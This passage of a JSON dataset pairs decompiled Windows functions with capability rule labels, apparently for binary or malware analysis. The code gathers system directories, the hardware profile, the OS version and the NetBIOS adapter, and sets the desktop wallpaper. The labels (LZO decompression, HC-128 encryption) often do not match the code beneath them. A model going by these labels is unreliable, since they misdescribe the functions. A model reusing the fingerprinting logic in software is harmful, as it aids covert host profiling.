        "decompiled_code": "\nvoid __fastcall fcn.00487eac(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffb8;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint lpNumberOfBytesWritten;\n    int32_t var_4h;\n    \n    puStack24 = 0x487ec1;\n    var_4h = param_2;\n    fcn.004059cc();\n    uStack28 = 0x487f26;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x48) != '\\0') {\n        iVar2 = var_4h;\n        if (var_4h != 0) {\n            iVar2 = *(var_4h + -4);\n        }\n        puStack24 = &stack0xfffffffc;\n        uVar1 = fcn.004059dc(iVar2, &fcn.00487eac::lpNumberOfBytesWritten, 0);\n        sub.kernel32.dll_WriteFile_1(*(in_EAX + 0x40), uVar1);\n        in_stack_ffffffb8 = *(in_EAX + 0x40);\n        sub.kernel32.dll_WriteFile_1(in_stack_ffffffb8, 0x487f3c, 2, &fcn.00487eac::lpNumberOfBytesWritten, 0);\n    }\n    *in_FS_OFFSET = in_stack_ffffffb8;\n    fcn.00405530(0x487f2d);\n    return;\n}\n",
        "token_count": 386
    },
    "00488080": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00488080(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_1ch = 0;\n    puStack44 = 0x48809a;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.004059cc();\n    puStack44 = 0x4880a2;\n    fcn.004059cc();\n    uStack48 = 0x488130;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    if (var_4h != 0) {\n        var_4h = *(var_4h + -4);\n    }\n    var_ch = var_4h >> 0x1f;\n    arg_8h = &fcn.00488080::var_1ch;\n    puStack44 = &stack0xfffffffc;\n    var_10h = var_4h;\n    fcn.0040ef34(arg_8h, *0x488140);\n    var_18h = var_1ch;\n    if (var_1ch != 0) {\n        var_18h = *(var_1ch + -4);\n    }\n    var_14h = var_18h >> 0x1f;\n    *in_FS_OFFSET = arg_8h;\n    iStack52 = 0x488137;\n    fcn.00405530();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 439
    },
    "00488144": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00488144(uint param_1, uint param_2)\n\n{\n    fcn.0040a53c();\n    fcn.00405a44(param_2);\n    return;\n}\n",
        "token_count": 47
    },
    "004881f8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004881f8(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x4882a7;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405c6c();\n    iVar2 = var_4h;\n    if (var_4h != 0) {\n        iVar2 = *(var_4h + -4);\n    }\n    uVar1 = fcn.004059dc();\n    sub.kernel32.dll_GetTempPathA(iVar2, uVar1);\n    fcn.00405c6c();\n    uVar3 = var_4h == 0 || var_4h == 4;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar3) {\n        fcn.00405584();\n    }\n    else {\n        fcn.00405864();\n    }\n    *in_FS_OFFSET = &var_8h;\n    fcn.00405554(0x4882ae);\n    return;\n}\n",
        "token_count": 325
    },
    "004882c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004882c0(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x48836f;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405c6c();\n    iVar2 = var_4h;\n    if (var_4h != 0) {\n        iVar2 = *(var_4h + -4);\n    }\n    uVar1 = fcn.004059dc(iVar2);\n    sub.kernel32.dll_GetSystemDirectoryA(uVar1);\n    fcn.00405c6c();\n    uVar3 = var_4h == 0 || var_4h == 4;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar3) {\n        fcn.00405584();\n    }\n    else {\n        fcn.00405864();\n    }\n    *in_FS_OFFSET = &var_8h;\n    fcn.00405554(0x488376);\n    return;\n}\n",
        "token_count": 322
    },
    "00488388": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00488388(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x488437;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405c6c();\n    iVar2 = var_4h;\n    if (var_4h != 0) {\n        iVar2 = *(var_4h + -4);\n    }\n    uVar1 = fcn.004059dc(iVar2);\n    sub.kernel32.dll_GetWindowsDirectoryA(uVar1);\n    fcn.00405c6c();\n    uVar3 = var_4h == 0 || var_4h == 4;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar3) {\n        fcn.00405584();\n    }\n    else {\n        fcn.00405864();\n    }\n    *in_FS_OFFSET = &var_8h;\n    fcn.00405554(0x48843e);\n    return;\n}\n",
        "token_count": 321
    },
    "004884e4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0048855a)\n// WARNING: Removing unreachable block (ram,0x0048856c)\n\nvoid fcn.004884e4(void)\n\n{\n    char in_AL;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    uStack32 = 0x4885f5;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x4885d0;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    fcn.00421644();\n    fcn.00421720();\n    fcn.00421864();\n    if (in_AL != '\\0') {\n        fcn.00409b6c();\n    }\n    fcn.00421fe8();\n    fcn.00405584();\n    fcn.00421f88();\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x4885d7;\n    uStack44 = 0x4885c2;\n    fcn.00404650();\n    uStack44 = 2;\n    uStack48 = 0;\n    sub.user32.dll_SystemParametersInfoA(0x14, 0);\n    return;\n}\n",
        "token_count": 367
    },
    "00489414": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00489414(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    uchar uVar1;\n    int32_t iStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint var_114h;\n    uint pszPath;\n    uint pidl;\n    int32_t var_4h;\n    \n    puStack292 = &stack0xfffffffc;\n    var_114h = 0;\n    var_4h = 0;\n    uStack296 = 0x4894d4;\n    iStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack300;\n    sub.shell32.dll_SHGetSpecialFolderLocation(0);\n    sub.shell32.dll_SHGetPathFromIDListA(pidl, &pszPath);\n    fcn.0040aa98();\n    uVar1 = var_4h == 0 || var_4h == 4;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar1) {\n        fcn.00405584();\n    }\n    else {\n        fcn.00405864();\n    }\n    *in_FS_OFFSET = &var_114h;\n    fcn.00405530(0x4894db);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 285
    },
    "00489d6c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00489d6c(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar2;\n    int32_t iStack192;\n    uint uStack188;\n    uchar *puStack184;\n    int32_t iStack180;\n    uint uStack176;\n    uchar *puStack172;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint lpHwProfileInfo;\n    uint var_83h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack172 = &stack0xfffffffc;\n    puStack184 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack176 = 0x489f02;\n    iStack180 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack180;\n    uStack188 = 0x489ec0;\n    iStack192 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack192;\n    iVar1 = sub.advapi32.dll_GetCurrentHwProfileA(&lpHwProfileInfo);\n    if (iVar1 == 0) {\n        fcn.004881f8();\n        fcn.0040a5c4();\n        fcn.00405818();\n        fcn.0048af64();\n        iVar2 = 0x489f30;\n        iVar1 = var_8h;\n        fcn.004058e0(0x489f30, var_8h, 0x489f24);\n        *in_FS_OFFSET = iVar2;\n    }\n    else {\n        fcn.004057a0();\n        fcn.00405a44(&var_4h);\n        fcn.004881f8();\n        fcn.0040a5c4();\n        fcn.00405818();\n        fcn.0048af64();\n        iVar2 = 0x489f30;\n        iVar1 = var_4h;\n        fcn.004058e0(0x489f30, var_8h, 0x489f3c);\n        *in_FS_OFFSET = iVar2;\n    }\n    *in_FS_OFFSET = iVar1;\n    fcn.00405554(0x489f09);\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 535
    },
    "0048ba0c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0048bb60)\n\nvoid fcn.0048ba0c(void)\n\n{\n    uint *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uStack200;\n    uint uStack184;\n    uint uStack180;\n    uchar *puStack176;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    int32_t var_88h;\n    int32_t var_84h;\n    uint var_80h;\n    \n    puStack176 = &stack0xfffffffc;\n    uStack180 = 0x48bbe3;\n    uStack184 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack184;\n    fcn.00405584();\n    lpVersionInformation = 0x94;\n    sub.kernel32.dll_GetVersionExA(&lpVersionInformation);\n    if (var_84h == 1) {\n        if (var_8ch == 0) {\n            fcn.00405584();\n        }\n        else if (var_8ch == 10) {\n            fcn.00405584();\n        }\n        else if (var_8ch == 0x5a) {\n            fcn.00405584();\n        }\n    }\n    else if (var_84h == 2) {\n        if (var_90h == 4) {\n            fcn.00405584();\n        }\n        else if (var_90h == 5) {\n            if (var_8ch == 0) {\n                fcn.00405584();\n            }\n            else if (var_8ch == 1) {\n                fcn.00405584();\n            }\n            else if (var_8ch == 2) {\n                fcn.00405584();\n            }\n        }\n        else if (var_90h == 6) {\n            if (var_8ch == 0) {\n                fcn.00405584();\n            }\n            else if (var_8ch == 1) {\n                fcn.00405584();\n            }\n        }\n    }\n    fcn.004057a0();\n    if (var_88h != 0) {\n        uVar3 = *in_EAX;\n        uVar2 = 0x48bcdc;\n        uVar1 = 0;\n        fcn.00409e4c(var_88h);\n        fcn.004058e0(0x48bce8, 0, var_88h, uVar1, uVar2, uVar3);\n    }\n    *in_FS_OFFSET = uStack200;\n    fcn.00405554(0x48bbea);\n    return;\n}\n",
        "token_count": 629
    },
    "0048c090": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0048c090(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *in_stack_fffffcf8;\n    int32_t iStack764;\n    uint uStack760;\n    uchar *puStack756;\n    uint var_2e4h;\n    uint var_2e0h;\n    uint var_2dch;\n    uint var_2d8h;\n    uint var_2d4h;\n    uint var_2d0h;\n    uint var_2cch;\n    uint var_2c8h;\n    uint var_2c4h;\n    uint var_2c0h;\n    uint var_2bch;\n    uint var_2b8h;\n    uint var_2b2h;\n    uint var_48h;\n    int32_t var_44h;\n    ushort var_40h;\n    uint var_3eh;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack756 = 0x48c0ad;\n    fcn.004059cc();\n    uStack760 = 0x48c21e;\n    iStack764 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffd04;\n    puStack756 = &stack0xfffffffc;\n    fcn.00403af4();\n    var_48h._0_1_ = 0x32;\n    sub.netapi32.dll_Netbios(&fcn.0048c090::var_48h);\n    fcn.00403af4();\n    fcn.00403af4();\n    fcn.00405a3c();\n    fcn.004030fc();\n    var_48h._0_1_ = 0x33;\n    var_18h._0_1_ = 0;\n    var_40h = 0x26a;\n    iVar1 = fcn.00402f00();\n    if (iVar1 == 0) {\n        fcn.00405584();\n    }\n    else {\n        var_44h = iVar1;\n        sub.netapi32.dll_Netbios(&fcn.0048c090::var_48h);\n        fcn.004030fc();\n        in_stack_fffffcf8 = &fcn.0048c090::var_8h;\n        fcn.0040af88(in_stack_fffffcf8);\n        fcn.00402f1c();\n        fcn.00405584();\n    }\n    *in_FS_OFFSET = in_stack_fffffcf8;\n    fcn.00405554(0x48c225);\n    return;\n}\n",
        "token_count": 602
    },
    "0048c8e4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0048c8e4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack24 = 0x48c96a;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.0040a67c();\n    fcn.00405a44(&var_4h);\n    do {\n        sub.kernel32.dll_Sleep_1();\n        fcn.0046d960();\n        fcn.0048c6b4();\n    } while( true );\n}\n",
        "token_count": 173
    },
    "004015ec": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.004015ec(void)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    uint8_t uVar4;\n    int32_t **in_EAX;\n    uint32_t uVar5;\n    \n    piVar2 = in_EAX[1];\n    piVar3 = *in_EAX;\n    *piVar2 = piVar3;\n    piVar3[1] = piVar2;\n    if (piVar2 == piVar3) {\n        uVar5 = piVar2 + -0x124dea >> 8 & 0xff;\n        uVar4 = piVar2 + -0x124dea >> 3 & 0x1f;\n        puVar1 = uVar5 * 4 + 0x493728;\n        *puVar1 = *puVar1 & (-2 << uVar4 | 0xfffffffeU >> 0x20 - uVar4);\n        if (*puVar1 == 0) {\n            uVar4 = uVar5 & 0x1f;\n            *0x493724 = *0x493724 & (-2 << uVar4 | 0xfffffffeU >> 0x20 - uVar4);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 288
    },
    "0040162c": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040162c(uint param_1, int32_t param_2)\n\n{\n    uint32_t *puVar1;\n    int32_t **ppiVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    uVar3 = param_2 - 0xb30U >> 8;\n    iVar4 = (uVar3 - 0x3ff & -(uVar3 < 0x3ff)) + 0x3ff;\n    uVar3 = iVar4 * 8;\n    ppiVar2 = *(uVar3 + 0x4937ac);\n    *in_EAX = uVar3 + 0x4937a8;\n    in_EAX[1] = ppiVar2;\n    *ppiVar2 = in_EAX;\n    *(uVar3 + 0x4937ac) = in_EAX;\n    if (ppiVar2 != uVar3 + 0x4937a8) {\n        return;\n    }\n    uVar3 = uVar3 >> 8 & 0xff;\n    puVar1 = uVar3 * 4 + 0x493728;\n    *puVar1 = *puVar1 | 1 << (iVar4 & 0x1f);\n    *0x493724 = *0x493724 | 1 << (uVar3 & 0x1f);\n    return;\n}\n",
        "token_count": 320
    },
    "00401a0c": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint8_t ** fcn.00401a0c(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint32_t *puVar4;\n    uint16_t uVar5;\n    uint8_t *puVar6;\n    uint8_t uVar7;\n    uint8_t **ppuVar8;\n    uint8_t **ppuVar9;\n    uint8_t *in_EAX;\n    uint8_t **ppuVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint8_t *puVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    bool bVar19;\n    \n    if (0xa2c < in_EAX) {\n        if (0x40a2c < in_EAX) {\n            if (in_EAX < 0) {\n                return NULL;\n            }\n            ppuVar10 = sub.kernel32.dll_VirtualAlloc(0, in_EAX + 0x10013 & 0xffff0000, 0x101000, 4);\n            if (ppuVar10 != NULL) {\n                ppuVar10[2] = in_EAX;\n                ppuVar10[3] = in_EAX + 0x10013 & 0xffff0000 | 4;\n                fcn.00401770();\n                ppuVar8 = *0x4957b0;\n                *ppuVar10 = 0x4957ac;\n                ppuVar9 = ppuVar10;\n                ppuVar10[1] = *0x4957b0;\n                *0x4957b0 = ppuVar9;\n                *ppuVar8 = ppuVar10;\n                *0x4957a8 = 0;\n                ppuVar10 = ppuVar10 + 4;\n            }\n            return ppuVar10;\n        }\n        uVar17 = in_EAX + 0xd3 & 0xffffff00;\n        uVar18 = uVar17 + 0x30;\n        if (*0x49304d != '\\0') {\n            while( true ) {\n                LOCK();\n                bVar19 = *0x493718 == 0;\n                *0x493718 = *0x493718 ^ bVar19 * (*0x493718 ^ 1);\n                if (bVar19) break;\n                if (*0x4935b5 == '\\0') {\n                    sub.kernel32.dll_Sleep();\n                    LOCK();\n                    bVar19 = *0x493718 == 0;\n                    *0x493718 = *0x493718 ^ bVar19 * (*0x493718 ^ 1);\n                    if (bVar19) break;\n                    sub.kernel32.dll_Sleep();\n                }\n            }\n        }\n        uVar15 = uVar17 - 0xb00;\n        uVar14 = uVar15 >> 0xd;\n        uVar11 = -1 << (uVar15 >> 8 & 0x1f) & *(uVar14 * 4 + 0x493728);\n        if (uVar11 == 0) {\n            uVar15 = -2 << (uVar14 & 0x1f) & *0x493724;\n            if (uVar15 == 0) {\n                if (*0x493720 < uVar18) {\n                    ppuVar10 = fcn.004016f8();\n                }\n                else {\n                    ppuVar10 = *0x49371c - uVar18;\n                    *0x49371c = ppuVar10;\n                    *0x493720 = *0x493720 - uVar18;\n                    ppuVar10[-1] = uVar18 | 2;\n                }\n                *0x493718 = 0;\n                return ppuVar10;\n            }\n            uVar14 = 0;\n            if (uVar15 != 0) {\n                for (; (uVar15 >> uVar14 & 1) == 0; uVar14 = uVar14 + 1) {\n                }\n            }\n            uVar15 = *(uVar14 * 4 + 0x493728);\n            uVar12 = 0;\n            if (uVar15 != 0) {\n                for (; (uVar15 >> uVar12 & 1) == 0; uVar12 = uVar12 + 1) {\n                }\n            }\n            uVar12 = uVar12 | uVar14 << 5;\n        }\n        else {\n            uVar12 = 0;\n            if (uVar11 != 0) {\n                for (; (uVar11 >> uVar12 & 1) == 0; uVar12 = uVar12 + 1) {\n                }\n            }\n            uVar12 = uVar15 >> 8 & 0xffffffe0 | uVar12;\n        }\n        iVar13 = uVar12 * 8;\n        ppuVar10 = *(iVar13 + 0x4937ac);\n        piVar1 = ppuVar10[1];\n        *(iVar13 + 0x4937ac) = piVar1;\n        *piVar1 = iVar13 + 0x4937a8;\n        if (iVar13 + 0x4937a8 == piVar1) {\n            uVar7 = uVar12 & 0x1f;\n            puVar4 = uVar14 * 4 + 0x493728;\n            *puVar4 = *puVar4 & (-2 << uVar7 | 0xfffffffeU >> 0x20 - uVar7);\n            if (*puVar4 == 0) {\n                puVar3 = (uVar14 >> 3) + 0x493724;\n                *puVar3 = *puVar3 & ~('\\x01' << (uVar14 & 7));\n            }\n        }\n        uVar15 = (ppuVar10[-1] & 0xfffffff0) - uVar18;\n        if (uVar15 == 0) {\n            puVar3 = ((ppuVar10[-1] & 0xfffffff0) - 4) + ppuVar10;\n            *puVar3 = *puVar3 & 0xf7;\n        }\n        else {\n            *(ppuVar10 + uVar17 + 0x2c) = uVar15 + 3;\n            *(ppuVar10 + (uVar15 - 8) + uVar18) = uVar15;\n            if (0xb2f < uVar15) {\n                fcn.0040162c();\n            }\n        }\n        ppuVar10[-1] = uVar17 + 0x32;\n        *0x493718 = 0;\n        return ppuVar10;\n    }\n    iVar13 = *((in_EAX + 3 >> 3) + 0x4935c0) * 8;\n    puVar3 = iVar13 + 0x48f04c;\n    puVar16 = puVar3;\n    if (*0x49304d != '\\0') {\n        while( true ) {\n            LOCK();\n            uVar7 = *puVar3;\n            *puVar3 = *puVar3 ^ (uVar7 == 0) * (*puVar3 ^ 1);\n            puVar16 = puVar3;\n            if (uVar7 == 0) break;\n            puVar16 = iVar13 + 0x48f06c;\n            LOCK();\n            uVar7 = *puVar16;\n            *puVar16 = *puVar16 ^ (uVar7 == 0) * (*puVar16 ^ 1);\n            if (uVar7 == 0) break;\n            puVar16 = iVar13 + 0x48f08c;\n            LOCK();\n            uVar7 = *puVar16;\n            *puVar16 = *puVar16 ^ (uVar7 == 0) * (*puVar16 ^ 1);\n            if (uVar7 == 0) break;\n            if (*0x4935b5 == '\\0') {\n                sub.kernel32.dll_Sleep(0);\n                LOCK();\n                uVar7 = *puVar3;\n                *puVar3 = *puVar3 ^ (uVar7 == 0) * (*puVar3 ^ 1);\n                puVar16 = puVar3;\n                if (uVar7 == 0) break;\n                sub.kernel32.dll_Sleep();\n            }\n        }\n    }\n    puVar3 = *(puVar16 + 4);\n    ppuVar10 = *(puVar3 + 8);\n    if (puVar3 != puVar16) {\n        *(puVar3 + 0xc) = *(puVar3 + 0xc) + 1;\n        puVar6 = ppuVar10[-1];\n        *(puVar3 + 8) = puVar6 & 0xfffffff8;\n        ppuVar10[-1] = puVar3;\n        if ((puVar6 & 0xfffffff8) != 0) {\n            *puVar16 = 0;\n            return ppuVar10;\n        }\n        iVar13 = *(puVar3 + 4);\n        *(iVar13 + 0x14) = puVar16;\n        *(puVar16 + 4) = iVar13;\n        *puVar16 = 0;\n        return ppuVar10;\n    }\n    puVar3 = *(puVar16 + 0x10);\n    uVar5 = *(puVar16 + 2);\n    if (ppuVar10 < *(puVar16 + 0xc) || ppuVar10 == *(puVar16 + 0xc)) {\n        piVar1 = puVar3 + 0xc;\n        *piVar1 = *piVar1 + 1;\n        *(puVar16 + 8) = uVar5 + ppuVar10;\n        *puVar16 = 0;\n        ppuVar10[-1] = puVar3;\n        return ppuVar10;\n    }\n    if (*0x49304d != '\\0') {\n        while( true ) {\n            LOCK();\n            bVar19 = *0x493718 == 0;\n            *0x493718 = *0x493718 ^ bVar19 * (*0x493718 ^ 1);\n            if (bVar19) break;\n            if (*0x4935b5 == '\\0') {\n                sub.kernel32.dll_Sleep();\n                LOCK();\n                bVar19 = *0x493718 == 0;\n                *0x493718 = *0x493718 ^ bVar19 * (*0x493718 ^ 1);\n                if (bVar19) break;\n                sub.kernel32.dll_Sleep();\n            }\n        }\n    }\n    uVar17 = puVar16[1] & *0x493724;\n    if (uVar17 == 0) {\n        if (*0x493720 < *(puVar16 + 0x18)) {\n            uVar17 = *(puVar16 + 0x1a);\n            ppuVar10 = fcn.004016f8();\n            if (ppuVar10 == NULL) {\n                *0x493718 = 0;\n                *puVar16 = 0;\n                return NULL;\n            }\n        }\n        else {\n            uVar17 = *0x493720;\n            if (*(puVar16 + 0x1a) + 0xb30 <= *0x493720) {\n                uVar17 = *(puVar16 + 0x1a);\n            }\n            ppuVar10 = *0x49371c - uVar17;\n            *0x493720 = *0x493720 - uVar17;\n            *0x49371c = ppuVar10;\n        }\n    }\n    else {\n        uVar18 = 0;\n        if (uVar17 != 0) {\n            for (; (uVar17 >> uVar18 & 1) == 0; uVar18 = uVar18 + 1) {\n            }\n        }\n        uVar17 = *(uVar18 * 4 + 0x493728);\n        iVar13 = 0;\n        if (uVar17 != 0) {\n            for (; (uVar17 >> iVar13 & 1) == 0; iVar13 = iVar13 + 1) {\n            }\n        }\n        iVar13 = iVar13 + uVar18 * 0x20;\n        iVar2 = iVar13 * 8;\n        ppuVar10 = *(iVar2 + 0x4937ac);\n        piVar1 = ppuVar10[1];\n        *(iVar2 + 0x4937ac) = piVar1;\n        *piVar1 = iVar2 + 0x4937a8;\n        if (iVar2 + 0x4937a8 == piVar1) {\n            uVar7 = iVar13 & 0x1f;\n            puVar4 = uVar18 * 4 + 0x493728;\n            *puVar4 = *puVar4 & (-2 << uVar7 | 0xfffffffeU >> 0x20 - uVar7);\n            if (*puVar4 == 0) {\n                puVar3 = (uVar18 >> 3) + 0x493724;\n                *puVar3 = *puVar3 & ~('\\x01' << (uVar18 & 7));\n            }\n        }\n        uVar17 = ppuVar10[-1] & 0xfffffff0;\n        if (uVar17 < 0x10a60) {\n            puVar3 = (uVar17 - 4) + ppuVar10;\n            *puVar3 = *puVar3 & 0xf7;\n        }\n        else {\n            uVar18 = *(puVar16 + 0x1a);\n            iVar13 = uVar17 - uVar18;\n            *(ppuVar10 + (uVar18 - 4)) = iVar13 + 3;\n            *(ppuVar10 + iVar13 + -8 + uVar18) = iVar13;\n            fcn.0040162c();\n            uVar17 = uVar18;\n        }\n    }\n    ppuVar10[-1] = uVar17 + 6;\n    *0x493718 = 0;\n    *ppuVar10 = puVar16;\n    ppuVar10[2] = NULL;\n    ppuVar10[3] = 0x1;\n    *(puVar16 + 0x10) = ppuVar10;\n    *(puVar16 + 8) = *(puVar16 + 2) + ppuVar10 + 8;\n    *(puVar16 + 0xc) = ppuVar10 + (uVar17 - *(puVar16 + 2));\n    *puVar16 = 0;\n    ppuVar10[7] = ppuVar10;\n    return ppuVar10 + 8;\n}\n",
        "token_count": 3306
    },
    "00402c98": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.00402c98(void)\n\n{\n    uint32_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    iVar3 = 0;\n    puVar2 = 0x48f04e;\n    uVar1 = 0;\n    do {\n        if ((*0x493706 == '\\0') || (uVar4 = uVar1,  (*puVar2 & 0xf) == 0)) {\n            uVar4 = *puVar2 >> 3;\n            for (; uVar1 < uVar4; uVar1 = uVar1 + 1) {\n                *(uVar1 + 0x4935c0) = iVar3 * '\\x04';\n            }\n        }\n        iVar3 = iVar3 + 1;\n        puVar2 = puVar2 + 0x10;\n        uVar1 = uVar4;\n    } while (iVar3 != 0x37);\n    return;\n}\n",
        "token_count": 223
    },
    "00405974": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
